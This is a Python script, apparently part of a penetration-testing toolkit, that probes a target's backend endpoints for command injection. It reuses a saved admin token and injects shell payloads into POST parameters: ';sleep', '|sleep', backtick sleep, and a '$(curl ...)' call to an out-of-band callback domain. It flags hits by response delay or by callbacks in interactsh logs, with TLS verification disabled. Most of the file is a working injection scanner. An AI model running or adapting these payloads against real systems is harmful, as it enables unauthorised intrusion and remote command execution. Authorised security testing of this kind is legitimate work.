"""V8 P1 覆盖补齐：命令注入/时间盲注探测（只读 + OAST）。
对真实接口参数注入 ;sleep / |sleep / $(curl OAST)；以响应耗时差与 OAST 回调判定。
输出 reports/final/cmd_injection.json
"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import random
import time
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = _pub.target()
TOK = os.path.join(ROOT, 'evidence', 'tokens', 'admin02.txt')
OUT = os.path.join(ROOT, 'reports', 'final', 'cmd_injection.json')
SLEEP = 3

def token():
    return open(TOK, encoding='utf-8').read().strip() if os.path.exists(TOK) else ''

def call(method, path, body, tmo=12):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token(), 'Content-Type': 'application/json'}
    t0 = time.time()
    try:
        r = requests.request(method, BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=tmo, verify=False)
        try:
            j = r.json()
        except Exception:
            j = {'raw': r.text[:100]}
        return {'http': r.status_code, 'code': j.get('code'), 'elapsed': round(time.time() - t0, 2)}
    except requests.exceptions.Timeout:
        return {'http': None, 'code': 'TIMEOUT', 'elapsed': round(time.time() - t0, 2)}
    except Exception as e:
        return {'http': None, 'code': 'ERR', 'elapsed': round(time.time() - t0, 2), 'error': str(e)[:100]}

def main():
    oast = json.load(open(os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json'), encoding='utf-8'))
    domain = oast['domain']
    tok = 'cmdi' + str(random.randint(100000, 999999))
    payloads = [f';sleep {SLEEP}', f'|sleep {SLEEP}', f'`sleep {SLEEP}`', f'$(curl -s http://{tok}.{domain}/c)']
    data = json.load(open(os.path.join(ROOT, 'knowledge', 'backend_endpoints.json'), encoding='utf-8'))
    targets = []
    for ep in data.get('endpoints') or []:
        keys = (ep.get('query_keys') or []) + (ep.get('body_keys') or [])
        keys = [k for k in keys if k != 't'][:2]
        if keys and ep.get('method') in ('GET', 'POST') and ep.get('path'):
            targets.append({'method': ep['method'], 'path': ep['path'], 'keys': keys})
    targets = targets[:8]
    result = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'targets': targets, 'results': [], 'oast_token': tok, 'oast_hits': 0}
    for t in targets:
        body0 = {k: '' for k in t['keys']} if t['method'] == 'POST' else None
        base = call(t['method'], t['path'], body0)
        for key in t['keys']:
            for pl in payloads:
                body = dict(body0 or {})
                if t['method'] == 'POST':
                    body[key] = pl
                else:
                    continue
                r = call(t['method'], t['path'], body)
                delay = r['elapsed'] - base['elapsed']
                result['results'].append({'path': t['path'], 'method': t['method'], 'param': key, 'payload': pl, 'code': r.get('code'), 'elapsed': r['elapsed'], 'delay': round(delay, 2), 'timeout': r.get('code') == 'TIMEOUT'})
    time.sleep(10)
    jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
    if os.path.exists(jsonl):
        for line in open(jsonl, encoding='utf-8', errors='replace'):
            if tok in line:
                result['oast_hits'] += 1
    result['summary'] = {'probes': len(result['results']), 'timeouts': len([r for r in result['results'] if r['timeout']]), 'slow': len([r for r in result['results'] if r['delay'] >= 2]), 'oast_hits': result['oast_hits']}
    json.dump(result, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print(json.dumps(result['summary'], ensure_ascii=False))
if __name__ == '__main__':
    main()
